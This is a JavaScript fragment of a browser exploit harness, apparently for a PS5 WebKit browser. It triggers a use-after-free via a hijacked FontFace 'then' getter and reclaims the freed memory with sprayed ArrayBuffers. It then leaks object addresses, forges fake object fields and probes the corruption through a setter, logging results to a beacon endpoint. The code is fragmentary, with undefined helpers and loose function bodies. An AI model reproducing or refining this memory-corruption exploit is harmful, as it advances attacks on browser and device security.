function log(s){L.textContent+=s+'\n';}
function bn(tag,data){
  try{
    var x=new XMLHttpRequest();
    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
    x.send();
  }catch(e){}
}
var KEY='p844v19_test';

function doUAF(id,cb){
  var st=document.createElement('style');
  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
  document.head.appendChild(st);
  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
  document.fonts.add(face);void face.loaded;
  var fabs=[],ffired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){if(ffired)return undefined;ffired=true;
      st.remove();st.textContent='';st=null;
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});
  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
  setTimeout(function(){
    delete FontFace.prototype.then;
    var hi=-1,bv=null;
    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
  },800);
}
function fin(tag,data){bn(tag,data);log(tag.replace('P844v19-','')+': '+data);setTimeout(function(){location.reload();},100);}

function snapAll(ab){var u=new Uint8Array(ab);var s=new Uint8Array(192);for(var i=0;i<192;i++)s[i]=u[i];return s;}
function diffSnap(before,after){
  var ch=[];
  for(var i=0;i<192;i++){
    if(before[i]!==after[i])ch.push('+'+i+'=0x'+before[i].toString(16)+'->0x'+after[i].toString(16));
  }
  return ch.length?ch.join(','):'none';
}

// T0: ALL ZERO except q0=gate — if crash = setter reads from AB (NULL deref)
// if survive = setter doesn't actually read from AB (unlikely given v18 crash)
function(){
  setTest(1);
  doUAF('T0',function(r){
    if(!r)return fin('P844v19-T0-OK','uaf=miss');
    var bv=r.bv;
    var self=bv[11]-0x58n;
    // Gate ON + all zeros
    bv[0]=0x100000001n;
    for(var i=1;i<24;i++)bv[i]=0n;
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v19-T0-OK','allzero|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================

// T11: Dual UAF, weight setter with q1→AB2 (AB2 all self2)
function(){
  setTest(12);
  doUAF('X',function(r1){
    if(!r1)return fin('P844v19-T11-OK','uaf1=miss');
    var self1=r1.bv[11]-0x58n;
    doUAF('Y',function(r2){
      if(!r2)return fin('P844v19-T11-OK','uaf2=miss|s1=0x'+self1.toString(16));
      var self2=r2.bv[11]-0x58n;
      // AB2: gate + self-referential
      r2.bv[0]=0x100000001n;
      for(var i=1;i<24;i++)r2.bv[i]=self2;
      // AB1: gate + q1→AB2, rest=self1
      r1.bv[0]=0x100000001n;
      r1.bv[1]=self2; // redirect q1 to AB2
      for(var i=2;i<24;i++)r1.bv[i]=self1;
      var snap2=snapAll(r2.abs[r2.hitIdx]);
      var err='';
      try{r1.face.weight='bold';}catch(e){err=e.message.substring(0,60);}
      var diff2=diffSnap(snap2,new Uint8Array(r2.abs[r2.hitIdx]));
      fin('P844v19-T11-OK','dualQ1|err='+(err||'none')+'|diff2='+diff2+'|s1=0x'+self1.toString(16)+'|s2=0x'+self2.toString(16));
    });
  });
},

function runTest(){
  if(testNum>=TESTS.length){
    log('ALL '+TESTS.length+' TESTS COMPLETE');
    bn('P844v19-DONE','all='+TESTS.length);
    clearTest();return;
  }
  log('Running '+NAMES[testNum]+'...');
  try{TESTS[testNum]();}catch(e){
    bn('P844v19-'+NAMES[testNum]+'-ERR',e.message);
    setTest(testNum+1);setTimeout(function(){location.reload();},100);
  }
}
